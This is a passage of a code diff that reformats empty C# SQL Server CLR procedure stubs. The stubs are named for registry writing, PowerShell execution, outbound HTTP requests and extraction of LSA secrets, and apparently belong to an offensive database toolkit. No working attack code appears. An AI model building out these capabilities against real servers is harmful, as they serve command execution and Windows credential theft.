-    public static void write_registry_property (SqlString regPath,SqlString regKey,SqlString regProperty)
-    {
-
-    }      
+    }
 
     [Microsoft.SqlServer.Server.SqlProcedure]
-    public static void write_registry_property (SqlString regPath,SqlString regKey,SqlString regProperty,SqlString regValue)
+    public static void write_registry_property(SqlString regPath, SqlString regKey, SqlString regProperty)
     {
 
-    }            
+    }
 
     [Microsoft.SqlServer.Server.SqlProcedure]
-    public static void run_command_ps (SqlString PsCode)
+    public static void write_registry_property(SqlString regPath, SqlString regKey, SqlString regProperty, SqlString regValue)
     {
 
-    }  
+    }
 
     [Microsoft.SqlServer.Server.SqlProcedure]
-    public static void send_http_post (SqlString PostRequest)
+    public static void run_command_ps(SqlString PsCode)
     {
 
-    }   
+    }
 
     [Microsoft.SqlServer.Server.SqlProcedure]
-    public static void send_http_get (SqlString GetRequest)
+    public static void send_http_post(SqlString PostRequest)
     {
 
-    }         
+    }
 
     [Microsoft.SqlServer.Server.SqlProcedure]
-    public static void get_lsa_secrets (SqlString GetRequest)
+    public static void send_http_get(SqlString GetRequest)
     {
 
-    }                     
+    }
+
+    [Microsoft.SqlServer.Server.SqlProcedure]
+    public static void get_lsa_secrets(SqlString GetRequest)
+    {
+
+    }
 };
